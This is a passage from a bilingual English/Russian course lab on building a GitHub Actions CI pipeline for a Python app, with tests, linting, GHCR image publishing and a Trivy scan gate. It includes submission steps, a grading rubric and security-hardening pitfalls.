- In `docs/LAB03.md`, state your coverage percentage and **one sentence on what's intentionally uncovered and why** (e.g. `if __name__ == "__main__":` blocks). Coverage isn't a target — Fowler again: *"useful for finding untested code; not a useful target."*
  * В `docs/LAB03.md` укажи процент покрытия и **одно предложение о том, что намеренно не покрыто и почему** (например, блоки `if __name__ == "__main__":`). Покрытие — не цель. Снова Фаулер: *«полезно для поиска непокрытого кода; бесполезно как цель»*.

---

## How to Submit

Как сдавать

```bash
git switch -c lab03
git add .github/workflows/python-ci.yml
git add app_python/tests/ app_python/requirements-dev.txt
git add app_python/docs/LAB03.md app_python/README.md
# bonus only:
git add .github/workflows/go-ci.yml          # if you did the language bonus
git commit -m "feat(lab03): CI pipeline — pytest, ruff, trivy gate, GHCR push"
git push -u origin lab03
```

Пояснение: команды создают ветку `lab03`, добавляют только файлы этой лабы и отправляют её в твой форк. Строка с `go-ci.yml` нужна, только если ты делал бонус с другим языком.

Open **two** PRs:

Открой **два** PR:

- `your-fork:lab03` → `course-repo:main` *(reviewed)*
  * `your-fork:lab03` → `course-repo:main` *(с ревью)*
- `your-fork:lab03` → `your-fork:main` *(merges into your own main when done)*
  * `your-fork:lab03` → `your-fork:main` *(сливается в твой main, когда всё готово)*

CI runs automatically on both — that's the whole point.

CI запускается на обоих автоматически — в этом и суть.

PR checklist:

Чек-лист PR:

```text
- [ ] Task 1 — pytest 3+ tests, ruff clean, output pasted in docs/LAB03.md
- [ ] Task 2 — workflow with on/permissions/concurrency/matrix; warm-cache time documented
- [ ] Task 3 — docker job needs:test, GHCR push works, ≥ 2 tags, no push from fork PRs
- [ ] Task 4 — Trivy gate with exit-code:"1", branch protection screenshot
- [ ] Bonus — second workflow with path filters AND coverage badge (if attempted)
```

Пояснение: это шаблон чек-листа, который нужно скопировать в описание PR и отмечать пункты по мере выполнения.

---

## Acceptance Criteria

Критерии приёмки

### Task 1 (2 pts)

Задача 1 (2 балла)

- ✅ `requirements-dev.txt` exact-pinned (`pytest==X.Y.Z`, not `>=`)
  * ✅ `requirements-dev.txt` с точным закреплением (`pytest==X.Y.Z`, а не `>=`)
- ✅ Three tests asserting **behaviour** (status + body shape), one of them the 404 path
  * ✅ Три теста, проверяющие **поведение** (статус + структура тела), один из них — путь 404
- ✅ `pytest -q` and `ruff check .` both pass locally; outputs in `docs/LAB03.md`
  * ✅ `pytest -q` и `ruff check .` проходят локально; выводы — в `docs/LAB03.md`

### Task 2 (3 pts)

Задача 2 (3 балла)

- ✅ `.github/workflows/python-ci.yml` triggers on `push` to `main` and `pull_request`, with a `paths:` filter
  * ✅ `.github/workflows/python-ci.yml` срабатывает на `push` в `main` и на `pull_request`, с фильтром `paths:`
- ✅ `concurrency` group by ref, `cancel-in-progress: true`
  * ✅ Группа `concurrency` по ref, `cancel-in-progress: true`
- ✅ Matrix over Python 3.12 + 3.13, `fail-fast: false`
  * ✅ Матрица по Python 3.12 + 3.13, `fail-fast: false`
- ✅ `setup-python@v5` with `cache: pip`, `cache-dependency-path:` set
  * ✅ `setup-python@v5` с `cache: pip` и заданным `cache-dependency-path:`
- ✅ Status badge in `app_python/README.md`; link to a green run
  * ✅ Статус-бейдж в `app_python/README.md`; ссылка на зелёный прогон

### Task 3 (3 pts)

Задача 3 (3 балла)

- ✅ `docker` job has `needs: test`
  * ✅ В джобе `docker` есть `needs: test`
- ✅ Uses `GITHUB_TOKEN` (no PAT), `permissions: { packages: write }` scoped to the job
  * ✅ Используется `GITHUB_TOKEN` (без PAT), `permissions: { packages: write }` ограничены джобой
- ✅ `metadata-action@v5` produces ≥ 2 tags (one immutable per-commit, e.g. `git-<sha>`)
  * ✅ `metadata-action@v5` создаёт ≥ 2 тега (один неизменяемый на коммит, например `git-<sha>`)
- ✅ `build-push-action@v6` with `cache-from/to: type=gha`
  * ✅ `build-push-action@v6` с `cache-from/to: type=gha`
- ✅ Image visible under your repo → Packages
  * ✅ Образ виден в разделе твоего репозитория → Packages
- ✅ No push from PRs (especially fork PRs)
  * ✅ Нет пуша из PR (особенно из форков)

### Task 4 (2 pts)

Задача 4 (2 балла)

- ✅ `aquasecurity/trivy-action@0.35.0` or later (NOT Trivy v0.69.4)
  * ✅ `aquasecurity/trivy-action@0.35.0` или новее (НЕ Trivy v0.69.4)
- ✅ `severity: HIGH,CRITICAL`, `exit-code: "1"`, `ignore-unfixed: true`
  * ✅ `severity: HIGH,CRITICAL`, `exit-code: "1"`, `ignore-unfixed: true`
- ✅ Scan blocks the docker job (in `test` or via a `scan` job + `needs:`)
  * ✅ Скан блокирует джобу docker (внутри `test` или через джобу `scan` + `needs:`)
- ✅ Branch protection requires `test` and `docker` checks
  * ✅ Защита ветки требует проверок `test` и `docker`

### Bonus (2 pts)

Бонус (2 балла)

- ✅ Second workflow with `paths:` filter on both, selective-trigger proof
  * ✅ Второй workflow с фильтром `paths:` в обоих, доказательство выборочного запуска
- ✅ Coverage XML generated, uploaded to Codecov/Coveralls, badge in README
  * ✅ Coverage XML сгенерирован, загружен в Codecov/Coveralls, бейдж в README

---

## Rubric

Критерии оценки

| Task | Points | Criteria |
|------|-------:|----------|
| **Task 1** — Unit tests | **2** | Real assertions, 404 path covered, locally green |
| **Task 2** — Test/lint job | **3** | Matrix + pip cache + concurrency + path filter; warm-cache time recorded |
| **Task 3** — GHCR build/push | **3** | `needs: test`, `GITHUB_TOKEN`, ≥ 2 tags, no fork-PR push, image visible |
| **Task 4** — Trivy gate | **2** | `exit-code: "1"`, gates docker, branch protection on |
| **Bonus** | **2** | Path-filtered multi-app + coverage |
| **Total** | **12** | 10 main + 2 bonus |

| Задача | Баллы | Критерии |
|------|-------:|----------|
| **Задача 1** — юнит-тесты | **2** | Настоящие проверки, покрыт путь 404, локально всё зелёное |
| **Задача 2** — джоба тестов/линта | **3** | Матрица + pip-кэш + concurrency + фильтр путей; зафиксировано время с тёплым кэшем |
| **Задача 3** — сборка/пуш в GHCR | **3** | `needs: test`, `GITHUB_TOKEN`, ≥ 2 тега, нет пуша из fork-PR, образ виден |
| **Задача 4** — гейт Trivy | **2** | `exit-code: "1"`, блокирует docker, защита ветки включена |
| **Бонус** | **2** | Мультиприложение с фильтрацией путей + покрытие |
| **Итого** | **12** | 10 основных + 2 бонусных |

**Grading:**

**Оценивание:**

- **10/10:** all jobs green, scan genuinely gates, tests assert behaviour, docs concise with real evidence
  * **10/10:** все джобы зелёные, скан реально блокирует, тесты проверяют поведение, документация краткая и с реальными доказательствами
- **8–9/10:** CI works, good tests, one minor gap (e.g. forgot to scope `permissions`)
  * **8–9/10:** CI работает, тесты хорошие, есть одна мелкая недоработка (например, забыл ограничить `permissions`)
- **6–7/10:** CI runs but Trivy is a warning, or no fork-PR guard, or thin tests
  * **6–7/10:** CI запускается, но Trivy только предупреждает, либо нет защиты от fork-PR, либо тесты слабые
- **<6/10:** workflow doesn't run, scan absent or non-gating, tests don't assert real behaviour
  * **<6/10:** workflow не запускается, скан отсутствует или не блокирует, тесты не проверяют реальное поведение

**For full points:** tests catch real bugs · workflow you can defend line-by-line · `GITHUB_TOKEN` not a PAT · Trivy fails the job on HIGH/CRITICAL · branch protection actually on.

**Чтобы получить максимум:** тесты ловят реальные баги · workflow, который ты можешь защитить построчно · `GITHUB_TOKEN` вместо PAT · Trivy валит джобу на HIGH/CRITICAL · защита ветки действительно включена.

---

## Resources

Ресурсы

<details>
<summary>📚 Documentation</summary>

📚 Документация

- [GitHub Actions Docs](https://docs.github.com/en/actions) · [Workflow Syntax](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions)
  * [Документация GitHub Actions](https://docs.github.com/en/actions) · [Синтаксис workflow](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions)
- [Building & Testing Python](https://docs.github.com/en/actions/automating-builds-and-tests/building-and-testing-python)
  * [Сборка и тестирование Python](https://docs.github.com/en/actions/automating-builds-and-tests/building-and-testing-python)
- [Publishing to GHCR](https://docs.github.com/en/actions/publishing-packages/publishing-docker-images)
  * [Публикация в GHCR](https://docs.github.com/en/actions/publishing-packages/publishing-docker-images)
- [Security Hardening for Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
  * [Усиление безопасности Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [pytest 8](https://docs.pytest.org/) · [Flask testing](https://flask.palletsprojects.com/en/stable/testing/) · [FastAPI testing](https://fastapi.tiangolo.com/tutorial/testing/)
  * [pytest 8](https://docs.pytest.org/) · [Тестирование Flask](https://flask.palletsprojects.com/en/stable/testing/) · [Тестирование FastAPI](https://fastapi.tiangolo.com/tutorial/testing/)
- [Trivy](https://github.com/aquasecurity/trivy) · [`trivy-action`](https://github.com/aquasecurity/trivy-action) (use ≥ v0.35.0) · [Grype](https://github.com/anchore/grype) alternative
  * [Trivy](https://github.com/aquasecurity/trivy) · [`trivy-action`](https://github.com/aquasecurity/trivy-action) (используй ≥ v0.35.0) · [Grype](https://github.com/anchore/grype) как альтернатива
- [SemVer](https://semver.org/) · [CalVer](https://calver.org/) · [`docker/metadata-action`](https://github.com/docker/metadata-action)
  * [SemVer](https://semver.org/) · [CalVer](https://calver.org/) · [`docker/metadata-action`](https://github.com/docker/metadata-action)
- [`act`](https://github.com/nektos/act) (run Actions locally) · [`actionlint`](https://github.com/rhysd/actionlint) · [`gh`](https://cli.github.com/) (`gh run watch`)
  * [`act`](https://github.com/nektos/act) (локальный запуск Actions) · [`actionlint`](https://github.com/rhysd/actionlint) · [`gh`](https://cli.github.com/) (`gh run watch`)

</details>

<details>
<summary>⚠️ Common Pitfalls (from real dry-runs)</summary>

⚠️ Частые ошибки (из реальных прогонов)

- **`@main` / floating tag pins** — `actions/checkout@main` lets an upstream compromise silently land in your CI. The `tj-actions/changed-files` 2025 attack (CVE-2025-30066) hit 23,000+ repos exactly this way. Pin to a major tag (`@v4`); for high-risk third-party actions, pin to a **full commit SHA** with a `# vX.Y.Z` comment.
  * **Закрепление на `@main` / плавающих тегах** — `actions/checkout@main` позволяет компрометации вышестоящего проекта незаметно попасть в твой CI. Атака на `tj-actions/changed-files` в 2025 году (CVE-2025-30066) задела более 23 000 репозиториев именно так. Закрепляйся на мажорном теге (`@v4`); для рискованных сторонних actions указывай **полный SHA коммита** с комментарием `# vX.Y.Z`.
- **`permissions:` not set → write-all default on older repos** — repos created before Feb 2023 default the workflow token to **read/write everything**. Always declare `permissions: { contents: read }` at the top and grant `packages: write` only on the job that needs it. Verify under **Settings → Actions → General → Workflow permissions** that "Read repository contents and packages permissions" is the default.
  * **Не задан `permissions:` → по умолчанию write-all в старых репозиториях** — в репозиториях, созданных до февраля 2023 года, токен workflow по умолчанию имеет **права чтения/записи на всё**. Всегда объявляй `permissions: { contents: read }` сверху и выдавай `packages: write` только той джобе, которой это нужно. Проверь в **Settings → Actions → General → Workflow permissions**, что по умолчанию стоит «Read repository contents and packages permissions».
- **Pushing images from fork PRs** — a fork can rewrite the Dockerfile to exfiltrate secrets via `RUN` commands and use your `GITHUB_TOKEN` to publish a tainted image to your GHCR namespace. Gate the docker job on `if: github.event_name != 'pull_request'` (or stricter: `github.event.pull_request.head.repo.fork == false`).
  * **Пуш образов из PR из форков** — форк может переписать Dockerfile, чтобы выкрасть секреты через команды `RUN`, и с помощью твоего `GITHUB_TOKEN` опубликовать заражённый образ в твой namespace GHCR. Поставь на джобу docker условие `if: github.event_name != 'pull_request'` (или строже: `github.event.pull_request.head.repo.fork == false`).
- **`trivy-action` floating + Trivy v0.69.4** — pinning `trivy-action@master` or installing Trivy via `curl ... install.sh` between March 19–20 2026 executed attacker code on the runner (CVE-2026-33634). Use `aquasecurity/trivy-action@0.35.0+` and pin Trivy to **v0.69.3** or a later patched build.
  * **Плавающий `trivy-action` + Trivy v0.69.4** — закрепление на `trivy-action@master` или установка Trivy через `curl ... install.sh` 19–20 марта 2026 года выполнили код атакующего на runner (CVE-2026-33634). Используй `aquasecurity/trivy-action@0.35.0+` и фиксируй Trivy на **v0.69.3** или более поздней исправленной сборке.
- **Trivy DB download failures on restricted networks** — if your runner can't reach `ghcr.io/aquasecurity/trivy-db`, the scan dies with `failed to download vulnerability DB`. Solutions: pre-pull the DB into a private mirror and set `TRIVY_DB_REPOSITORY=<your-mirror>`, or schedule a daily warm-up workflow that runs Trivy once on `main`.
  * **Сбой загрузки базы Trivy в закрытых сетях** — если runner не может достучаться до `ghcr.io/aquasecurity/trivy-db`, скан падает с ошибкой `failed to download vulnerability DB`. Решения: заранее скачай базу в приватное зеркало и задай `TRIVY_DB_REPOSITORY=<your-mirror>` либо настрой ежедневный прогревающий workflow, который раз в день запускает Trivy на `main`.
- **Matrix `fail-fast: true` hides regressions** — leaving the default `true` kills 3.13 the moment 3.12 fails. You then "fix" 3.12 without ever seeing what 3.13 was about to fail on. Always set `fail-fast: false` on a version matrix.
  * **`fail-fast: true` в матрице скрывает регрессии** — оставленное по умолчанию `true` убивает 3.13, как только падает 3.12. Ты «чинишь» 3.12, так и не увидев, на чём собиралась упасть 3.13. Всегда ставь `fail-fast: false` в матрице версий.
- **Cache hits never invalidate** — if you point `cache-dependency-path:` at the wrong file (e.g. `requirements.txt` but you only updated `requirements-dev.txt`), the cache hashes don't change and you reinstall the old versions for the next month. Use the file your install command actually consumes, or list both.
  * **Кэш не инвалидируется** — если указать в `cache-dependency-path:` не тот файл (например, `requirements.txt`, а обновил ты только `requirements-dev.txt`), хэши кэша не меняются, и ты месяц переустанавливаешь старые версии. Указывай файл, который реально читает команда установки, или перечисли оба.
- **Tests pass but `app.py` doesn't import** — pytest happily collects zero tests if your test file has a `SyntaxError` and tells you `0 passed`. Use `pytest -q --strict-markers` and watch for the "collected 0 items" warning, or assert `len(tests) >= 3` in a meta-test.
  * **Тесты «проходят», но `app.py` не импортируется** — pytest спокойно соберёт ноль тестов, если в тестовом файле `SyntaxError`, и сообщит `0 passed`. Используй `pytest -q --strict-markers` и следи за предупреждением «collected 0 items» либо проверяй `len(tests) >= 3` в мета-тесте.
- **`pytest -q` reports `0 passed` because Flask's auto-reload swallowed the import error** — disable `FLASK_DEBUG` in the test fixture: `app.config["TESTING"] = True; app.config["DEBUG"] = False`.
  * **`pytest -q` сообщает `0 passed`, потому что автоперезагрузка Flask проглотила ошибку импорта** — отключи `FLASK_DEBUG` в фикстуре теста: `app.config["TESTING"] = True; app.config["DEBUG"] = False`.
- **`ubuntu-latest` rotated under you** — Microsoft swaps the `latest` alias on its own schedule. A workflow that "worked yesterday" suddenly fails because `python3.10` is gone or `apt-get` returns 404. Pin to `ubuntu-24.04`.
  * **`ubuntu-latest` поменялся под тобой** — Microsoft меняет алиас `latest` по своему графику. Workflow, который «работал вчера», внезапно падает, потому что `python3.10` исчез или `apt-get` возвращает 404. Закрепляй `ubuntu-24.04`.
- **`docker/metadata-action` with only `type=raw,value=latest`** — pushes one mutable tag and nothing immutable. Always combine `latest` with `type=sha,prefix=git-` (or `type=semver`) so every build is traceable.
  * **`docker/metadata-action` только с `type=raw,value=latest`** — пушит один изменяемый тег и ничего неизменяемого. Всегда комбинируй `latest` с `type=sha,prefix=git-` (или `type=semver`), чтобы каждая сборка была отслеживаемой.

</details>

<details>
<summary>🛠️ Tools worth knowing</summary>

🛠️ Инструменты, которые стоит знать

- [`act`](https://github.com/nektos/act) — runs your workflow in a local container; faster feedback than push-and-pray
  * [`act`](https://github.com/nektos/act) — запускает твой workflow в локальном контейнере; обратная связь быстрее, чем «пушь и молись»
- [`actionlint`](https://github.com/rhysd/actionlint) — lints workflow YAML; catches `runs-on: ubunto-24.04` typos before CI does
  * [`actionlint`](https://github.com/rhysd/actionlint) — линтит YAML workflow; ловит опечатки вроде `runs-on: ubunto-24.04` до CI
- [`gh run watch`](https://cli.github.com/manual/gh_run_watch) — live-tail a running workflow from the terminal
  * [`gh run watch`](https://cli.github.com/manual/gh_run_watch) — смотреть вывод выполняющегося workflow прямо из терминала
- [`gh workflow run`](https://cli.github.com/manual/gh_workflow_run) — trigger a `workflow_dispatch` run from your shell
  * [`gh workflow run`](https://cli.github.com/manual/gh_workflow_run) — запускать `workflow_dispatch` из своей оболочки
- [Dependabot](https://docs.github.com/en/code-security/dependabot) — auto-PRs to keep `actions/checkout@v4` and `pytest` fresh; one `.github/dependabot.yml`, no token, no third party
  * [Dependabot](https://docs.github.com/en/code-security/dependabot) — автоматические PR, чтобы `actions/checkout@v4` и `pytest` оставались свежими; один `.github/dependabot.yml`, без токена и сторонних сервисов

</details>

---

## Looking Ahead

Что дальше

| Lab | What CI does for it |
|---:|---|
| 4 | `terraform plan` becomes a CI gate — same idea as `pytest` |
| 5–6 | `ansible-playbook --check` in CI; idempotency proven on every PR |
| 7–8 | Integration tests once Loki + Prometheus land |
| 9–10 | CI validates K8s manifests / Helm charts (`helm lint`, `kubeval`) |
| 13 | ArgoCD watches the GHCR image **this** pipeline publishes — GitOps loop closes |
| Every future lab | this workflow is your safety net |

| Лаба | Что CI делает для неё |
|---:|---|
| 4 | `terraform plan` становится гейтом CI — та же идея, что с `pytest` |
| 5–6 | `ansible-playbook --check` в CI; идемпотентность доказывается в каждом PR |
| 7–8 | Интеграционные тесты, когда появятся Loki + Prometheus |
| 9–10 | CI проверяет манифесты K8s / чарты Helm (`helm lint`, `kubeval`) |
| 13 | ArgoCD следит за GHCR-образом, который публикует **этот** пайплайн, — цикл GitOps замыкается |
| Каждая будущая лаба | этот workflow — твоя страховка |

> **Remember:** a good pipeline is fast, deterministic, and boring. Excitement in CI is a smell.
>
> **Помни:** хороший пайплайн быстрый, детерминированный и скучный. Азарт в CI — дурной знак.
